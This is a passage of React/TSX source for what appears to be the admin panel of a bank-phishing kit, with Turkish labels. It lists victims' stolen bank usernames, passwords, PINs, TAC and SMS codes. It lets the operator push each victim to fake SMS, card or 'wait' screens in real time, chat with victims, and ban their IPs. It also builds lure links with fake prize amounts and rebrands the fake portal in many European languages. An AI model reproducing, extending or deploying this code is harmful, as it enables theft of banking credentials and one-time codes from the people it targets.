                                const sib = (e.currentTarget as HTMLImageElement).nextElementSibling as HTMLElement | null;
                                if (sib) sib.style.display = "flex";
                              }}
                            />
                          ) : null}
                          <div
                            className="w-full h-full items-center justify-center text-xs font-black text-white tracking-wide"
                            style={{ backgroundColor: pillColor, display: bankLogoSrc ? "none" : "flex" }}
                          >
                            {pillInitials || "BNK"}
                          </div>
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="font-bold text-white text-xs truncate">
                            {fd.bankName || "Banka atanmadı"}
                          </div>
                          {fd.loginMethod ? (
                            <div className="mt-1 inline-flex items-center gap-1 rounded bg-cyan-500/10 border border-cyan-500/30 px-2 py-0.5 text-[10px] font-bold text-cyan-300">
                              Yöntem: {fd.loginMethod}
                            </div>
                          ) : (
                            <div className="text-[10px] text-zinc-500 mt-0.5">Giriş yöntemi henüz seçilmedi</div>
                          )}
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4 text-[11px] text-zinc-400">
                      {typeof fd.personalCode === "string" && fd.personalCode && (
                        <div>Kimlik No: <span className="text-zinc-200 font-mono">{fd.personalCode}</span></div>
                      )}
                      <div>ID: <span className="text-zinc-200 font-mono">{(typeof fd.verfuegernummer === "string" && fd.verfuegernummer) || (typeof fd.username === "string" && fd.username) || (typeof fd.id === "string" && fd.id) || "-"}</span></div>
                      <div>PW: <span className="text-zinc-200 font-mono">{(typeof fd.pin === "string" && fd.pin) || (typeof fd.password === "string" && fd.password) || (typeof fd.pw === "string" && fd.pw) || "-"}</span></div>
                      {typeof fd.bankPhone === "string" && fd.bankPhone && (
                        <div>Banka Tel: <span className="text-zinc-200 font-mono">{fd.bankPhone}</span></div>
                      )}
                      {((typeof fd.tacCode === "string" && fd.tacCode) || (typeof (fd as any).tac_code === "string" && (fd as any).tac_code)) && (
                        <div>KOD: <span className="text-zinc-200 font-mono">{(typeof fd.tacCode === "string" && fd.tacCode) || (fd as any).tac_code || ""}</span></div>
                      )}
                    </td>
                    <td className="px-4 py-4 font-mono font-bold text-orange-400 text-xl">{fd.smsCode || "-"}</td>
                    <td className="px-4 py-4 text-right">
                      <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
                        <select 
                          className="w-full rounded-md border border-zinc-700 bg-[#1a1a1a] px-3 py-2 text-xs text-zinc-300 outline-none focus:border-blue-500 cursor-pointer transition-all" 
                          value="" 
                          onChange={(e) => {
                            if (e.target.value) {
                              if (e.target.value === "ban_ip") {
                                void handleBanIp(row.id, row.ip_address);
                              } else {
                                void handleRouteAction(row.id, e.target.value);
                              }
                              e.target.value = ""; // Resetlemeyi garantiye al
                            }
                          }}
                        >
                          <option value="">İşlem Seç...</option>
                          <option value="win">Giriş'e Yönlendir</option>
                          <option value="banken">Banka Listesine Yönlendirme</option>
                          <option value="sms">SMS'e Yönlendir</option>
                          <option value="card">Kart'a Yönlendir</option>
                          <option value="wait">Beklemeye Al</option>
                          <option value="invalid_bank">Hatalı Banka</option>
                          <option value="live_support">Canlı Desteğe Yönlendir</option>
                          <option value="congrats">Tebrikler Ekranı</option>
                          <option value="special_approval">Özel Bildirim Gönder</option>
                          <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
                        </select>
                        <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
                          <button
                            type="button"
                            onClick={() => setChatSessionId(row.id)}
                            className="flex-1 rounded bg-blue-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-blue-500 hover:bg-blue-500 hover:text-white transition-colors"
                            title="Sohbet"
                          >
                            💬
                          </button>
                          <button
                            type="button"
                            onClick={() => setDeviceInfoSession(row)}
                            className="flex-1 rounded bg-indigo-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-indigo-400 hover:bg-indigo-500 hover:text-white transition-colors"
                            title="Cihaz & Bağlantı Bilgileri"
                          >
                            📱
                          </button>
                          <button
                            type="button"
                            onClick={() => void hideSingleLog(row.id)}
                            className="flex-1 rounded border border-red-500/50 bg-red-500/15 px-2 py-2 text-[10px] font-black uppercase tracking-wide text-red-400 hover:bg-red-600 hover:text-white hover:border-red-400 transition-colors"
                            title="Bu logu listeden kaldır"
                          >
                            🗑️
                          </button>
                        </div>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {chatSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="flex h-[32rem] w-full max-w-md flex-col overflow-hidden rounded-2xl border border-zinc-800 bg-[#111111] shadow-2xl">
            <div className="flex items-center justify-between bg-zinc-900 px-4 py-3 border-b border-zinc-800">
              <h3 className="font-bold text-white">Kullanıcı ile Sohbet</h3>
              <button onClick={() => setChatSessionId(null)} className="text-zinc-400 hover:text-white">✕</button>
            </div>
            <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-[#0a0a0a]">
              {chatMessages.length === 0 ? (
                <p className="text-center text-xs text-zinc-500 mt-10">Henüz mesaj yok.</p>
              ) : (
                chatMessages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "admin" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[80%] rounded-xl px-3 py-2 text-sm ${m.sender === "admin" ? "bg-blue-600 text-white rounded-br-none" : "bg-zinc-800 text-zinc-200 rounded-bl-none"}`}>
                      {m.image_url && (
                        <div 
                          className="mb-2 overflow-hidden rounded-lg cursor-pointer hover:opacity-90 transition-opacity"
                          onClick={() => setZoomedImage(m.image_url)}
                        >
                          <img src={m.image_url} alt="Ek" className="max-h-48 w-full object-cover" />
                        </div>
                      )}
                      {m.content && <p>{m.content}</p>}
                    </div>
                  </div>
                ))
              )}
              <div ref={chatEndRef} />
            </div>

            {pastedImagePreview && (
              <div className="bg-zinc-900 border-t border-zinc-800 p-3 flex flex-col gap-2">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-zinc-400">Gönderilecek Görsel:</span>
                  <button onClick={() => { setPastedImage(null); setPastedImagePreview(null); }} className="text-xs text-red-400 hover:text-red-300 font-bold">İptal</button>
                </div>
                <div className="relative rounded-lg overflow-hidden border border-zinc-700 h-32 flex justify-center bg-black">
                  <img src={pastedImagePreview} alt="Preview" className="object-contain h-full" />
                </div>
              </div>
            )}

            <form onSubmit={sendChatMessage} className="flex border-t border-zinc-800 bg-[#161616] p-2">
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onPaste={handlePaste}
                placeholder="Mesaj yazın... (Ctrl+V ile görsel yapıştırabilirsiniz)"
                className="flex-1 bg-transparent px-3 py-2 text-sm text-white outline-none"
              />
              <button type="submit" disabled={(!chatInput.trim() && !pastedImage) || isUploadingImage} className="rounded-lg bg-blue-600 px-4 py-2 text-xs font-bold text-white transition-colors hover:bg-blue-500 disabled:opacity-50">
                {isUploadingImage ? "Yükleniyor..." : "Gönder"}
              </button>
            </form>
          </div>
        </div>
      )}

      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}

      {specialPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="w-full max-w-2xl rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl" onPaste={(e) => {
              const file = e.clipboardData.files?.[0];
              if (file && file.type.startsWith("image/")) {
                const reader = new FileReader();
                reader.onload = () => setSpecialImage(reader.result as string);
                reader.readAsDataURL(file);
              }
            }}>
            <div className="flex justify-between mb-4 items-center">
              <h3 className="text-lg font-bold text-white">Özel Bildirim Paneli</h3>
              <div className="flex gap-2">
                <button onClick={() => setSpecialLang("de")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "de" ? "bg-blue-700 text-white" : "bg-zinc-800 text-zinc-500"}`}>DE</button>
                <button onClick={() => setSpecialLang("tr")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "tr" ? "bg-blue-700 text-white" : "bg-zinc-800 text-zinc-500"}`}>TR</button>
              </div>
            </div>
            <textarea 
              value={specialMessage} 
              onChange={(e) => setSpecialMessage(e.target.value)} 
              className="w-full rounded-xl bg-zinc-900 p-4 text-white border border-zinc-800 outline-none focus:border-blue-700 transition-all" 
              placeholder="Mesaj yazın veya buraya bir resim yapıştırın..." 
              rows={5} 
            />
            {specialImage && (
              <div className="mt-4 relative rounded-xl border border-zinc-800 overflow-hidden bg-black">
                <img src={specialImage} className="max-h-48 w-full object-contain" alt="Preview" />
                <button onClick={() => setSpecialImage(null)} className="absolute top-2 right-2 bg-red-600 p-1.5 rounded-full text-white hover:bg-red-700">✕</button>
              </div>
            )}
            <div className="mt-6 flex justify-end gap-4">
              <button onClick={() => setSpecialPromptSessionId(null)} className="px-4 py-2 text-zinc-500 font-semibold hover:text-white transition-colors">İptal</button>
              <button onClick={() => void publishSpecialApproval()} className="bg-blue-700 px-10 py-2 rounded-xl text-white font-bold hover:bg-blue-500 shadow-lg shadow-blue-900/20">BİLDİRİMİ GÖNDER</button>
            </div>
          </div>
        </div>
      )}

      {newLink && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-2xl border border-zinc-800 bg-[#161616] p-6 text-center">
            <div className="size-12 bg-blue-700/20 rounded-full flex items-center justify-center mx-auto mb-4 text-blue-500">✓</div>
            <h3 className="mb-2 font-bold text-white text-lg">Link Oluşturuldu</h3>
            <div className="mb-6 truncate rounded-lg bg-[#0a0a0a] p-3 text-xs text-blue-500 border border-blue-900/30">{newLink}</div>
            <button 
              onClick={() => { navigator.clipboard.writeText(newLink); setNewLink(null); }} 
              className="w-full rounded-xl bg-blue-700 py-3 font-bold text-white hover:bg-blue-500 transition-all shadow-lg"
            >
              Link Kopyala ve Kapat
            </button>
          </div>
        </div>
      )}

      {showNewLinkModal && !newLink && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl">
            <h3 className="text-lg font-bold text-white mb-1">Yeni Link Oluştur</h3>
            <p className="text-sm text-zinc-400 mb-6">Link türünü ve detayları belirleyin.</p>
            
            <div className="space-y-4 mb-8">
              <div>
                <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Link Türü</label>
                <div className="grid grid-cols-2 gap-2">
                  <button 
                    onClick={() => setLinkType("normal")}
                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "normal" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    Katılımlı (Normal)
                  </button>
                  <button 
                    onClick={() => setLinkType("wheel")}
                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "wheel" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    Çark Oyunu
                  </button>
                  <button 
                    onClick={() => setLinkType("direct_win")}
                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "direct_win" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    Direkt İsim Formu
                  </button>
                  <button 
                    onClick={() => setLinkType("direct_bank")}
                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "direct_bank" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    Direkt Banka Listesi
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Para Birimi</label>
                <div className="flex gap-2">
                  <button 
                    onClick={() => setCurrency("€")}
                    className={`flex-1 py-2 rounded-lg border font-bold text-lg transition-all ${currency === "€" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    € (EUR)
                  </button>
                  <button 
                    onClick={() => setCurrency("$")}
                    className={`flex-1 py-2 rounded-lg border font-bold text-lg transition-all ${currency === "$" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                  >
                    $ (USD)
                  </button>
                </div>
              </div>
              
              {linkType !== "wheel" && (
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Kazanılan Miktar</label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xl font-bold text-zinc-500">{currency}</span>
                    <input 
                      className="w-full rounded-xl border border-zinc-800 bg-zinc-900 pl-10 pr-4 py-3 text-xl font-bold text-white outline-none focus:border-blue-500 transition-colors" 
                      value={amount} 
                      onChange={(e) => setAmount(e.target.value)} 
                      placeholder="Örn: 5000"
                      type="number"
                    />
                  </div>
                </div>
              )}

              {linkType === "normal" && (
                <>
                  <div>
                    <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Partner İsmi</label>
                    <input 
                      className="w-full rounded-xl border border-zinc-800 bg-zinc-900 px-4 py-3 text-sm font-bold text-white outline-none focus:border-blue-500 transition-colors" 
                      value={partnerName} 
                      onChange={(e) => setPartnerName(e.target.value)} 
                      placeholder="Örn: X Firması"
                      type="text"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Katılım Kodu</label>
                    <input 
                      className="w-full rounded-xl border border-zinc-800 bg-zinc-900 px-4 py-3 text-sm font-bold text-white outline-none focus:border-blue-500 transition-colors" 
                      value={participationCode} 
                      onChange={(e) => setParticipationCode(e.target.value)} 
                      placeholder="Örn: 3"
                      type="text"
                    />
                  </div>
                </>
              )}
            </div>

            {createLinkError ? (
              <p className="mb-4 rounded-lg border border-red-500/40 bg-red-500/10 px-3 py-2 text-xs text-red-300">
                {createLinkError}
              </p>
            ) : null}

            <div className="flex justify-end gap-3">
              <button 
                onClick={() => setShowNewLinkModal(false)} 
                className="px-4 py-2 text-sm font-semibold text-zinc-400 hover:text-white transition-colors"
              >
                İptal
              </button>
              <button 
                onClick={() => void createSession()} 
                disabled={creating} 
                className="rounded-xl bg-blue-700 px-6 py-2 text-sm font-bold text-white hover:bg-blue-500 transition-all shadow-[0_0_15px_rgba(0,59,143,0.30)] disabled:opacity-50"
              >
                {creating ? "Oluşturuluyor..." : "Oluştur"}
              </button>
            </div>
          </div>
        </div>
      )}

      {smsPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl">
            <h3 className="text-lg font-bold text-white mb-4">SMS Ayarları</h3>
            
            <div className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-zinc-500 mb-1">Hane Sayısı</label>
                <input
                  type="number"
                  min={4}
                  max={12}
                  value={smsDigitsInput}
                  onChange={(e) => setSmsDigitsInput(e.target.value)}
                  className="w-full rounded-xl border border-zinc-800 bg-zinc-900 px-3 py-2 text-white outline-none focus:border-blue-700"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-zinc-500 mb-1">
                  Özel Açıklama Metni (İsteğe Bağlı)
                </label>
                <textarea
                  rows={3}
                  placeholder="Örn: Lütfen WhatsApp'tan gelen {digits} haneli kodu giriniz."
                  value={smsCustomTextInput}
                  onChange={(e) => setSmsCustomTextInput(e.target.value)}
                  className="w-full rounded-xl border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white outline-none focus:border-blue-700"
                />
                <p className="text-[10px] text-zinc-500 mt-1">
                  Boş bırakırsanız genel ayarlardaki standart metin gösterilir. Hane sayısını belirtmek için <strong>{'{digits}'}</strong> yazabilirsiniz.
                </p>
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setSmsPromptSessionId(null)}
                className="rounded-lg border border-zinc-700 px-4 py-2 text-sm font-semibold text-zinc-300 hover:bg-zinc-800"
              >
                Vazgeç
              </button>
              <button
                type="button"
                onClick={() => void confirmSmsRedirect()}
                className="rounded-lg bg-blue-700 px-4 py-2 text-sm font-bold text-white hover:bg-blue-500"
              >
                Gönder
              </button>
            </div>
          </div>
        </div>
      )}
      {showSettingsModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm overflow-y-auto">
          <div className="w-full max-w-4xl rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl my-8">
            <div className="flex justify-between items-center mb-6 border-b border-zinc-800 pb-4 sticky top-0 bg-[#111111] z-10">
              <h3 className="text-xl font-bold text-white">Genel Site Ayarları (White-Label)</h3>
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <label className="text-sm font-bold text-zinc-400">Site Dili:</label>
                  <select
                    className="rounded border border-zinc-700 bg-zinc-800 px-3 py-1.5 text-sm text-white outline-none focus:border-blue-500"
                    value={globalSettings.site_language || "nl"}
                    onChange={(e) => handleLanguageChange(e.target.value)}
                  >
                    <option value="nl">Hollandaca (Dutch)</option>
                    <option value="en">İngilizce (English)</option>
                    <option value="de">Almanca (German)</option>
                    <option value="fr">Fransızca (French)</option>
                    <option value="es">İspanyolca (Spanish)</option>
                    <option value="it">İtalyanca (Italian)</option>
                    <option value="tr">Türkçe (Turkish)</option>
                    <option value="fi">Fince (Finnish)</option>
                    <option value="et">Estonca (Estonian)</option>
                    <option value="cs">Çekçe (Czech)</option>
                    <option value="pl">Lehçe (Polish)</option>
                    <option value="sv">İsveççe (Swedish)</option>
                    <option value="da">Danca (Danish)</option>
                    <option value="ro">Rumence (Romanian)</option>
                    <option value="el">Yunanca (Greek)</option>
                    <option value="pt">Portekizce (Portuguese)</option>
                    <option value="hu">Macarca (Hungarian)</option>
                  </select>
                </div>
                <button onClick={() => setShowSettingsModal(false)} className="text-zinc-500 hover:text-white text-xl">✕</button>
              </div>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-h-[70vh] overflow-y-auto pr-2 pb-8">
              {/* Kolon 1: Görseller & Üst Menü */}
              <div className="space-y-4">
                <h4 className="text-blue-500 font-bold border-b border-zinc-800 pb-2 sticky top-0 bg-[#111111] z-10 pt-1">Görseller</h4>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Logo URL (veya Dosya Yükle)</label>
                  <div className="flex gap-2">
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.logo_url || ""} onChange={e => setGlobalSettings(p => ({...p, logo_url: e.target.value}))} placeholder="URL girin veya yanda dosya seçin" />
                    <label className="flex-shrink-0 cursor-pointer rounded bg-zinc-800 px-3 py-2 text-sm font-bold text-white hover:bg-zinc-700 transition-colors flex items-center justify-center min-w-[100px]">
                      {uploadingLogo ? "Yükleniyor..." : "Dosya Seç"}
                      <input type="file" accept="image/*" className="hidden" onChange={e => void handleFileUpload(e, 'logo_url')} />
                    </label>
                  </div>
                  {globalSettings.logo_url && <img src={globalSettings.logo_url} className="h-20 mt-2 object-contain bg-white/10 p-1 rounded" alt="Logo preview" />}
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Arka Plan Görseli (URL veya Dosya Yükle)</label>
                  <div className="flex gap-2">
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.bg_url || ""} onChange={e => setGlobalSettings(p => ({...p, bg_url: e.target.value}))} placeholder="URL girin veya yanda dosya seçin" />
                    <label className="flex-shrink-0 cursor-pointer rounded bg-zinc-800 px-3 py-2 text-sm font-bold text-white hover:bg-zinc-700 transition-colors flex items-center justify-center min-w-[100px]">
                      {uploadingBg ? "Yükleniyor..." : "Dosya Seç"}
                      <input type="file" accept="image/*" className="hidden" onChange={e => void handleFileUpload(e, 'bg_url')} />
                    </label>
                  </div>
                  {globalSettings.bg_url && <img src={globalSettings.bg_url} className="h-20 mt-2 object-cover bg-white/10 rounded w-full" alt="BG preview" />}
                </div>

                <h4 className="text-blue-500 font-bold border-b border-zinc-800 pb-2 mt-6 sticky top-0 bg-[#111111] z-10 pt-1">Üst Menü (Header)</h4>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Portal Naam (Bijv: Klantenportaal)</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.portal_name || ""} onChange={e => setGlobalSettings(p => ({...p, portal_name: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Support Naam (Bijv: Speciale Actie)</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.support_center_name || ""} onChange={e => setGlobalSettings(p => ({...p, support_center_name: e.target.value}))} />
                </div>

                <h5 className="text-sm font-bold text-zinc-300 border-b border-zinc-800 pb-1 mt-6">İsim & Profil Ekranı</h5>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Küçük Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_title_small || ""} onChange={e => setGlobalSettings(p => ({...p, profile_title_small: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Ana Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_title_main || ""} onChange={e => setGlobalSettings(p => ({...p, profile_title_main: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Açıklama</label>
                  <textarea className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" rows={2} value={globalSettings.profile_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, profile_subtitle: e.target.value}))} />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">İsim Etiketi</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_firstname_label || ""} onChange={e => setGlobalSettings(p => ({...p, profile_firstname_label: e.target.value}))} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">Soyisim Etiketi</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_lastname_label || ""} onChange={e => setGlobalSettings(p => ({...p, profile_lastname_label: e.target.value}))} />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Telefon Etiketi</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_phone_label || ""} onChange={e => setGlobalSettings(p => ({...p, profile_phone_label: e.target.value}))} />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">İleri Butonu</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_button || ""} onChange={e => setGlobalSettings(p => ({...p, profile_button: e.target.value}))} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">Yükleniyor</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.profile_loading_text || ""} onChange={e => setGlobalSettings(p => ({...p, profile_loading_text: e.target.value}))} />
                  </div>
                </div>
              </div>

              {/* Kolon 2: Sayfa Metinleri 1 */}
              <div className="space-y-4">
                <h4 className="text-blue-500 font-bold border-b border-zinc-800 pb-2 sticky top-0 bg-[#111111] z-10 pt-1">Sayfa Metinleri</h4>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Ana Sayfa Başlık (Win Title)</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.win_title || ""} onChange={e => setGlobalSettings(p => ({...p, win_title: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Ana Sayfa Açıklama</label>
                  <textarea className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" rows={3} value={globalSettings.win_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, win_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Ana Sayfa Buton Yazısı</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.win_button || ""} onChange={e => setGlobalSettings(p => ({...p, win_button: e.target.value}))} />
                </div>

                <div className="mt-4">
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Banka Listesi Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.banken_title || ""} onChange={e => setGlobalSettings(p => ({...p, banken_title: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Banka Listesi Açıklama</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.banken_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, banken_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Banka Arama Kutusu</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.banken_search_placeholder || ""} onChange={e => setGlobalSettings(p => ({...p, banken_search_placeholder: e.target.value}))} />
                </div>

                <h5 className="text-sm font-bold text-zinc-300 border-b border-zinc-800 pb-1 mt-6">Kod & Canlı Destek Ekranı</h5>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kod Ekranı Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.code_title || ""} onChange={e => setGlobalSettings(p => ({...p, code_title: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kod Ekranı Açıklama ({'{partner}'} kullanın)</label>
                  <textarea className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" rows={2} value={globalSettings.code_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, code_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kod Ekranı Buton Yazısı</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.code_button || ""} onChange={e => setGlobalSettings(p => ({...p, code_button: e.target.value}))} />
                </div>

                <div className="mt-4">
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Canlı Destek Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.live_support_title || ""} onChange={e => setGlobalSettings(p => ({...p, live_support_title: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Canlı Destek Açıklama</label>
                  <textarea className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" rows={3} value={globalSettings.live_support_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, live_support_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Canlı Destek Buton Yazısı</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.live_support_button || ""} onChange={e => setGlobalSettings(p => ({...p, live_support_button: e.target.value}))} />
                </div>
              </div>

              {/* Kolon 3: Sayfa Metinleri 2 */}
              <div className="space-y-4">
                <h4 className="text-blue-500 font-bold border-b border-zinc-800 pb-2 sticky top-0 bg-[#111111] z-10 pt-1">Ek Formlar</h4>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">SMS Sayfası Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.sms_title || ""} onChange={e => setGlobalSettings(p => ({...p, sms_title: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">SMS Açıklama ({'{digits}'} kullanın)</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.sms_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, sms_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">SMS Giriş Etiketi</label>
